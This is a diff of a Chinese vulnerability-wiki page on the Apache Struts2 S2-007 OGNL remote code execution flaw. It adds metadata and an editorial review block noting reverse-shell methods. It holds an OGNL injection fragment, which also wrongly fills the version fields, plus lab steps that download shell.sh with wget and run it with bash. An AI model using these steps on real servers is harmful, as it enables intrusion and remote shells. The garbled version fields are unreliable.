@@ -1,9 +1,54 @@
 ---
 version: "' + (#_memberAccess['allowStaticMethodAccess']=true,#foo=new java.lang.Boolean('"
 source: "Threekiii/Vulnerability-Wiki"
+title: "Apache Struts2 S2-007 远程代码执行漏洞"
+product: "Apache Struts2类型转换/验证"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "active"
+primary_identifiers: "S2-007"
+referenced_identifiers: ""
+identifier_role: "primary"
+prerequisites: "2.0.0–2.2.3，类型转换失败并回填用户值；Integer age和验证规则是本例入口"
+affected_versions: "' + (#_memberAccess['allowStaticMethodAccess']=true,#foo=new java.lang.Boolean('"
+source_status: "unknown"
+side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
+id: "vw-e8c924acd648797361d0042b"
+entity_id: "ve-e8c924acd648797361d0042b"
+schema_version: "1"
 ---
 
 # Apache Struts2 S2-007 远程代码执行漏洞
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：2.0.0–2.2.3，类型转换失败并回填用户值；Integer age和验证规则是本例入口
+- 证据范围：Action和验证XML清楚，比只贴表达式完整；明确Mac calculator不适于当前Linux环境。
+
+### 本次正文校订
+
+- 按实际内容修正 3 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 普通验证表单称上传表单不准确
+- 缺官方CVE和修复版本，具体测试版本/JDK未列
+- 反弹payload依赖IOUtils及cwd/目标平台，不能自动泛化
+- 写shell和改变memberAccess的副作用缺说明
+
+### 操作风险与资料使用
+
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 ## 漏洞描述
 
@@ -58,7 +103,7 @@ public class UserAction extends ActionSupport {
 
 Vulhub 执行以下命令启动 s2-007 测试环境：
 
-```
+```shell
 docker-compose build
 docker-compose up -d
 ```
@@ -89,7 +134,7 @@ python3环境下：python -m http.server 80
 
 上传 shell.sh 文件的命令为：
 
-```
+```shell
 wget 192.168.174.128/shell.sh
 ```
 
@@ -101,7 +146,7 @@ wget 192.168.174.128/shell.sh
 
 执行 shell.sh 文件的命令为：
 
-```
+```shell
 bash /usr/local/tomcat/shell.sh
 ```
 
